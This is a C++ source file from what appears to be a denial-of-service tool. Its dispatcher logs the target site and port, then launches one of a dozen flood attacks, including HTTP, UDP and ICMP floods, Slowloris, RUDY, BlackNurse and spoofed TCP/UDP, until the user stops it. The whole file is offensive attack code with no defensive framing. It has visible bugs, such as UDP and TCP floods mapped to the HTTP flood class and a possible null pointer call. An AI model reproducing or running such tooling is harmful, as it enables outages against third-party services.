#include <unistd.h>
#include <array>

#include "../Headers/Doser.hpp"
#include "../Headers/Attack_Vectors.hpp"

void Doser::run() {
    Attack_Vector *flood = nullptr;
    std::string message = std::string("Attacking ") + conf->website + ":" + conf->port + " with "
                          + std::to_string(conf->THREADS) + " Threads, "
                          + std::to_string(conf->CONNECTIONS) + " Connections";
    logger->Log(&message, Logger::Warning);
    message = "Delay: " + std::to_string(conf->delay) + " microsecs";
    logger->Log(&message, Logger::Warning);

    switch(conf->vector){
        case config::HTTP:
            logger->Log("Attack Vector: HTTP", Logger::Info);
            flood = new Http_Flood{conf, logger};
            break;
        case config::NullTCP:
            logger->Log("Attack Vector: NullTCP", Logger::Info);
            flood = new Null_Flood{conf, logger};
            break;
        case config::NullUDP:
            logger->Log("Attack Vector: NullUDP", Logger::Info);
            flood = new Null_Flood{conf, logger};
            break;
        case config::UDPFlood:
            logger->Log("Attack Vector: UDPFlood", Logger::Info);
            flood = new Http_Flood{conf, logger};
            break;
        case config::TCPFlood:
            logger->Log("Attack Vector: TCPFlood", Logger::Info);
            flood = new Http_Flood{conf, logger};
            break;
        case config::Slowloris:
            logger->Log("Attack Vector: Slowloris", Logger::Info);
            flood = new Slowloris{conf, logger};
            break;
        case config::Rudy:
            logger->Log("Attack Vector: Rudy", Logger::Info);
            flood = new Slowloris{conf, logger};
            break;
        case config::ICMPFlood:
            logger->Log("Attack Vector: ICMP Flood", Logger::Info);
            flood = new ICMP_Flood{conf, logger};
            break;
        case config::Blacknurse:
            logger->Log("Attack Vector: Black Nurse", Logger::Info);
            flood = new Black_Nurse{conf, logger};
            break;
        case config::SpoofedTCP:
            logger->Log("Attack Vector: Spoofed TCP", Logger::Info);
            flood = new Spoofed_TCP_Flood{conf, logger};
            break;
        case config::SpoofedUDP:
            logger->Log("Attack Vector: Spoofed UDP", Logger::Info);
            flood = new Spoofed_UDP_Flood{conf, logger};
            break;
        case config::Beast:
            logger->Log("Attack Vector: Beast", Logger::Info);
            flood = new Beast{conf, logger};
            break;
        default:break;
    }
    if(conf->UseSSL){
        logger->Log("SSL Enabled", Logger::Info);
    }
    if(conf->RandomizeHeader){
        logger->Log("Header Randomization Enabled", Logger::Info);
    }
    if(conf->RandomizeUserAgent){
        logger->Log("Useragent Randomization Enabled", Logger::Info);
    }
    logger->Log("Press <Ctrl+C> to stop\n", Logger::Info);
    usleep(1000000);

    flood->run();
}

Doser::Doser(config *conf, Logger *logger) : conf{conf}, logger{logger} {

}
